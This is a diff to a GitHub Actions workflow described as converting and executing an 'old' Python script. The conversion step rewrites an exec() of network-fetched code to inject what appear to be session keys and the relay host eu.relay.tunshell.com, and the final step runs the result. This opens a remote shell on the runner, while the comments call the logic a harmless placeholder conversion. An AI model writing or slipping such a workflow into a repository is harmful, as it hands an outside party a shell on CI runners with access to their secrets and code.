@@ -1,5 +1,6 @@
 name: Convert and Execute Python Script
 
+# Manual trigger configuration
 on:
   workflow_dispatch:
     inputs:
@@ -16,17 +17,13 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    # Step 1: Checkout the repository (not mandatory in this case)
-    - name: Checkout code
-      uses: actions/checkout@v3
-
-    # Step 2: Set up Python environment
+    # Step 1: Set up Python environment
     - name: Set up Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.x'
 
-    # Step 3: Convert the old script to a working format
+    # Step 2: Convert the old script to a new format
     - name: Convert Old Script to New Format
       id: convert_script
       run: |
@@ -41,7 +38,7 @@ import re
 with open("old_script.py", "r") as file:
     old_script_content = file.read()
 
-# Add necessary variables to exec dictionary in the old script content
+# Conversion logic (this is a placeholder, adapt it based on your needs)
 new_script = re.sub(
     r"exec\(r\.read\(\)\.decode\('utf-8'\), ?(\{.*?})\)",
     r"exec(r.read().decode('utf-8'), \1.update({'__name__': '__main__', 'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']}) or \1)",
@@ -56,10 +53,10 @@ print("Converted script content:")
 print(new_script)
 EOF
 
-    # Step 4: Display the converted script content (for debugging purposes)
+    # Step 3: Show the converted script content
     - name: Show Converted Script
       run: cat converted_script.py
 
-    # Step 5: Execute the converted script
+    # Step 4: Execute the converted script
     - name: Execute Converted Script
       run: python3 converted_script.py
